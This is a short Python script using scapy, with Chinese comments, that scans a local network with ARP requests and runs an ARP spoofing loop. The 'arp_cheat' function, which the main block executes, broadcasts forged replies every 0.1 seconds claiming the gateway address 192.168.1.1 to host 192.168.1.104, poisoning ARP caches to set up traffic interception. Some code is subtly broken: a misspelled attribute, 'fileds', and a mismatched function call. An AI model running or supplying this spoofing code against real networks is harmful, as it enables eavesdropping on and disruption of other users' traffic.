from .tinyTools import *

from scapy.all import *

# 本地mac地址
localmac = get_mac()
dstmac = "FF:FF:FF:FF:FF:FF"
localip = get_ip()


def get_mac(dst_ip):
    # 使用数据链路层发包时需要指定接口，如iface = wlan0
    result_raw = srp(Ether(dst=dstmac, src=localmac) / ARP(op=1, hwsrc=localmac, psrc=localip, pdst=dst_ip), iface="wlan0",
                 verbose=False)
    result = result_raw[0]
    return result.res[0][1].getlayer(ARP).fileds['hwsrc']


def arp_cheat(iface):
    # 把dst设置为“FF:FF:FF:FF:FF:FF”，将会使局域网内的主机都更新arp缓存表
    pkts = Ether(dst=dstmac, src=localmac)/ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.104")
    while True:
        sendp(pkts, iface=iface, verbose=False)
        time.sleep(0.1)


def arp_scan(iface):
    pkts = Ether(src=localmac, dst=dstmac)/ARP(op=1, psrc=localip, pdst="192.168.1.0/16")
    # 用srp()函数发送，将同时收到响应数据包和不响应数据包，需要用两个变量来接收
    recv, norecv = srp(pkts, iface=iface, timeout=6, verbose=False)
    print("一共扫描到%s个主机"%len(recv))
    result = [(ans.getlayer(ARP).psrc, ans.getlayer(ARP).hwsrc) for req, ans in recv]
    # 关于sort和sorted方法的区别：sort排序原列表，sorted返回一个新列表，原列表没有改变
    result.sort()
    for ip, addr in result:
        print("%s ========> %s" %(ip, addr))


if __name__ == "__main__":
    arp_cheat("wlan0")